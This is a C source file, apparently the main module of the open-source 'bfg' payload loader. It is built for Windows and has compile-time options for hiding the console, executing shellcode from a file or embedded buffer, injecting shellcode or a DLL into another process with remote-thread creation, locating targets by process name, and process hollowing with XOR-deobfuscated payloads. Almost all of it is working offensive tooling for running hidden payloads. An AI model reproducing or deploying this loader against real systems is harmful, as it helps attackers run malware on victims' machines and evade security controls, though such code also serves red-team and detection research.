/*
Author: Daniel Sauder, Florian Saager
License: https://www.gnu.org/licenses/gpl.txt or LICENSE file
Web: https://github.com/govolution/bfg
*/

//     "         .==,_                                          \n"
//     "        .===,_`\\                                        \n"
//     "      .====,_ ` \\      .====,__                         \n"
//     "---     .==-,`~. \\           `:`.__,                    \n"
//     " ---      `~~=-.  \\           /^^^     MEEP MEEP        \n"
//     "   ---       `~~=. \\         /                          \n"
//     "                `~. \\       /                           \n"
//     "                  ~. \\____./                            \n"
//     "                    `.=====)                            \n"
//     "                 ___.--~~~--.__                         \n"
//     "       ___\\.--~~~              ~~~---.._|/              \n"
//     "       ~~~\\\"                             /              \n"

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <windows.h>
#include <tchar.h>
#include <winternl.h>
#include "defs.h"
#ifdef IMAGE
	#include <psapi.h>
#endif
#ifdef PROCESS_HOLLOWING
	#include "include/hollow.h"
#endif


int get_filesize(char *fvalue);
unsigned char* load_file(char *fvalue, unsigned char *buf, int size2);
void exec_shellcode(unsigned char *shellcode);
void exec_shellcode64(unsigned char *shellcode);
#ifdef INJECT_SHELLCODE
DWORD inject_sc_process(unsigned char *shellcode, DWORD pid);
#endif
#ifdef INJECT_DLL
DWORD InjectDLL(PCHAR pDll, DWORD dwProcessID); 
#endif
#ifdef IMAGE
DWORD get_pid_by_name(char *imgname);
#endif
#ifdef PROCESS_HOLLOWING
typedef LONG (WINAPI *NtUnmapViewOfSection) (HANDLE ProcessHandle, PVOID BaseAddress);
void newRunPE(LPSTR szFilePath, PVOID pFile, LPTSTR commandLine);
#endif

int main (int argc, char **argv)
{
	#ifdef QUIET
		ShowWindow(GetConsoleWindow(), SW_HIDE);
	#endif
		
	char *fvalue = NULL;

	int index;
	int c;

	opterr = 0;

	#ifdef LVALUE
		fvalue=argv[1];
	#endif

	#ifdef PRINT_DEBUG
		printf ("fvalue = %s ", fvalue);
		for (index = optind; index < argc; index++)
			printf ("Non-option argument %s\n", argv[index]);
	#endif

// compute #defines from defs.h
#ifdef FVALUE
	int size = strlen(FVALUE);
	fvalue=(char*)malloc(size);
	strcpy(fvalue,FVALUE);
#endif

	// exec shellcode from a given file or from defs.h
	if (fvalue)
	{
		unsigned char *buffer;
		unsigned char *shellcode;
		int size;
//#ifndef FVALUE
#ifdef LVALUE
	#ifdef PRINT_DEBUG
		printf("exec shellcode from file\n");
	#endif
		size = get_filesize(fvalue);
		buffer = load_file(fvalue, buffer, size);
		//shellcode=buffer;
		unsigned char *buf =buffer;
#endif
	#ifdef FVALUE
		size = strlen (FVALUE);
		buffer = FVALUE;
	#endif

	#ifndef LOADEXEC_DLL
	#ifndef PROCESS_HOLLOWING
	#ifndef INJECT_DLL
		shellcode = buf;	//buf is from defs.h if shellcode is included
	#endif
	#endif
	#endif
	
	#ifndef INJECT_SHELLCODE
	#ifndef X64 
		exec_shellcode(shellcode);
	#endif
	#ifdef X64
		exec_shellcode64(shellcode);
	#endif
	#endif
	
	#ifdef INJECT_SHELLCODE
	#ifndef IMAGE
		int tmp;
		#ifndef LVALUE
			tmp=atoi(argv[1]);
		#endif
		#ifdef LVALUE
			tmp=atoi(argv[2]);
		#endif
		int r;	
		r=inject_sc_process(shellcode, tmp);
		#ifdef PRINT_DEBUG
		printf("return from inject_sc_process, val: %d\n",r);
		#endif
	#endif
	#endif
	
	#ifdef IMAGE
	#ifdef INJECT_SHELLCODE
		printf("Imagename to search: %s\n", IMAGE); 
		int tmp=get_pid_by_name(IMAGE);
		#ifdef PRINT_DEBUG
			printf("PID %d\n", tmp);
		#endif
		inject_sc_process(shellcode, tmp);	
	#endif
	#endif
	}

	#ifdef INJECT_DLL
	#ifdef PID
		CHAR pDllPath[5000] = "";
		GetFullPathNameA(argv[1], 5000, pDllPath, NULL);
		return InjectDLL(pDllPath, atoi(argv[2]));
	#endif
	#ifdef IMAGE
		int tmp=get_pid_by_name(IMAGE);
		#ifdef PRINT_DEBUG
			printf("Imagename to search: %s\n", IMAGE); 
			printf("PID %d\n", tmp);
		#endif
		CHAR pDllPath[5000] = "";
		GetFullPathNameA(argv[1], 5000, pDllPath, NULL);
		return InjectDLL(pDllPath, tmp);
	#endif
	#endif
	
	#ifdef PROCESS_HOLLOWING
		#ifdef XOR_OBFUSCATION
			// Deobfuscate payload
			// (payloadSize, keyByte0 and payload specified in defs.h by make_bfg)
			// deobfuscate() defined in hollow.h
			deobfuscate(payload, payloadSize, keyByte0);			
		#endif
	
		#ifdef ALT_OBFUSCATION
			// Alternative, more complex deobfuscation of payload
			// (payloadSize, keyByte0, keyByte1 and payload specified in defs.h by make_bfg)
			// altDeobfuscate() defined in hollow.h
			altDeobfuscate(payload, payloadSize, keyByte0, keyByte1);
		#endif
	
		// Instanciate target process
		// Target process specified in first bfg argument argv[1]	
		// Command line arguments for payload in second bfg argument argv[2]
		char commandLine [256];
		strcpy(commandLine, argv[1]);
	
		// Handle empty command line arguments for payload executable
		// Relevant if user does not specify "" as second bfg argument
		if(argv[2]) {
			strcat(commandLine, " ");
			strcat(commandLine, argv[2]);
		}	
			
		// Instanciate target and pass command line arguments
		#ifdef X64
			newRunPE64(argv[1], payload, commandLine);	
		#else
			newRunPE32(argv[1], payload, commandLine);
		#endif	
	#endif

	#ifdef LOADEXEC_DLL
	HANDLE hModule = LoadLibrary(argv[1]);
	#endif

	return 0;
}


#if defined(LVALUE) || defined(UVALUE)
int get_filesize(char *fvalue)
{
	int size,rc1;
	FILE *fp1 = fopen(fvalue, "rb");
	if (fp1 == NULL)
	{
		printf("get_filesize, %s not found\n", fvalue);
		return 0;
	}
	for (size = 0; (rc1 = getc(fp1)) != EOF; size++) {}
	fclose(fp1);
	
	#ifdef PRINT_DEBUG
		printf("get_filesize, filesize %s: %d\n", fvalue, size);
	#endif

	return size;
}
#endif

#if defined(LVALUE) || defined(UVALUE)
// return pointer to text buffer
unsigned char* load_file(char *fvalue, unsigned char *buffer, int size)
{
	#ifdef PRINT_DEBUG
		printf("load_file called: fvalue: %s, size: %d\n", fvalue, size);
	#endif

	//allocate buffer, open file, read file to the buffer, close the file
	buffer=(unsigned char*)malloc(size+1);
	int i, rc;

	for (i=0; i<size; i++)
		buffer[i]=0x0;

	FILE *fp = fopen(fvalue, "rb");
	if (fp == NULL)
	{
		printf("load_file, %s not found\n", fvalue);
		return 0;
	}

	for (i=0; i<size; i++)
	{
		rc = getc(fp);
		buffer[i] = rc;
	}

	#ifdef PRINT_DEBUG
		printf("%s\n",buffer);
	#endif

	fclose(fp);
	return buffer;
}
#endif


#ifndef X64
void exec_shellcode(unsigned char *shellcode)
{
	#ifdef PRINT_DEBUG
		printf("exec_shellcode\n ");
		int size=strlen(shellcode);
		printf("shellcode size: %d\n", size);
	#endif

	int (*funct)();
	funct = (int (*)()) shellcode;
	(int)(*funct)();
}
#endif


#ifdef X64
void exec_shellcode64(unsigned char *shellcode)
{
#ifdef PRINT_DEBUG
	printf("exec_shellcode64\n ");
	int size=strlen(shellcode);
	printf("shellcode size: %d\n", size);
#endif
	int len=strlen(shellcode);
	DWORD l=0;
	VirtualProtect(shellcode,len,PAGE_EXECUTE_READWRITE,&l);
	(* (int(*)()) shellcode)();
}
#endif

#ifdef INJECT_SHELLCODE
#define CREATE_THREAD_ACCESS (PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ)
DWORD inject_sc_process(unsigned char *shellcode, DWORD pid)
{
	PBYTE pShellcode = shellcode;
	SIZE_T szShellcodeLength = strlen(shellcode);
	HANDLE hProc;
	HANDLE hRemoteThread;
	PVOID pRemoteBuffer;
	DWORD dwProcessID = pid;

	if(!dwProcessID) {
		return 1;
	}
	hProc = OpenProcess(CREATE_THREAD_ACCESS, FALSE, dwProcessID);
	if(!hProc) {
		return 2;
	}

	pRemoteBuffer = VirtualAllocEx(hProc, NULL, szShellcodeLength, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
	if (!pRemoteBuffer) {
		return 4;
	}
	if (!WriteProcessMemory(hProc, pRemoteBuffer, pShellcode, szShellcodeLength, NULL)) {
		return 5;
	}

	hRemoteThread = CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)pRemoteBuffer, NULL, 0, NULL);
	if (!hRemoteThread) {
		return 6;
	}
	CloseHandle(hProc);

	return 0;	
}
#endif

#ifdef IMAGE
DWORD get_pid_by_name(char *imgname)
{
	DWORD aProcesses[1024], cbNeeded, cProcesses;
	unsigned int i;

	if ( !EnumProcesses( aProcesses, sizeof(aProcesses), &cbNeeded ) )
	{
		return -1;
	}

	cProcesses = cbNeeded / sizeof(DWORD);

	for ( i = 0; i < cProcesses; i++ )
	{
		if( aProcesses[i] != 0 )
		{
			DWORD processID = aProcesses[i];
			TCHAR szProcessName[MAX_PATH] = TEXT("<unknown>");

			HANDLE hProcess = OpenProcess( PROCESS_QUERY_INFORMATION |
					PROCESS_VM_READ,
					FALSE, processID );

			if (NULL != hProcess )
			{
				HMODULE hMod;
				DWORD cbNeeded;

				if ( EnumProcessModules( hProcess, &hMod, sizeof(hMod), 
							&cbNeeded) )
				{
					GetModuleBaseName( hProcess, hMod, szProcessName, 
							sizeof(szProcessName)/sizeof(TCHAR) );
				}
			}


			if (strcmp(szProcessName,IMAGE) == 0)
			{
				CloseHandle( hProcess );
				return processID;
			}

			CloseHandle( hProcess );
		}
	}

	return -2;
}

#endif

#ifdef INJECT_DLL
#define CREATE_THREAD_ACCESS (PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ)
DWORD InjectDLL(PCHAR pDll, DWORD dwProcessID) 
{
	HANDLE hProc;
	HANDLE hRemoteThread;
	LPVOID pRemoteBuffer;
	LPVOID pLoadLibAddr;

	if(!dwProcessID) {
		return 1;
	}
	hProc = OpenProcess(CREATE_THREAD_ACCESS, FALSE, dwProcessID);
	if(!hProc) {
		return 2;
	}

	pLoadLibAddr = (LPVOID)GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
	if (!pLoadLibAddr) {
		return 3;
	}
	pRemoteBuffer = VirtualAllocEx(hProc, NULL, strlen(pDll), (MEM_RESERVE | MEM_COMMIT), PAGE_READWRITE);
	if (!pRemoteBuffer) {
		return 4;
	}

	if (!WriteProcessMemory(hProc, pRemoteBuffer, pDll, strlen(pDll), NULL)) {
		return 5;
	}
	hRemoteThread = CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)pLoadLibAddr, pRemoteBuffer, 0, NULL);
	if (!hRemoteThread) {
		return 6;
	}
	CloseHandle(hProc);
	return 0;
}
#endif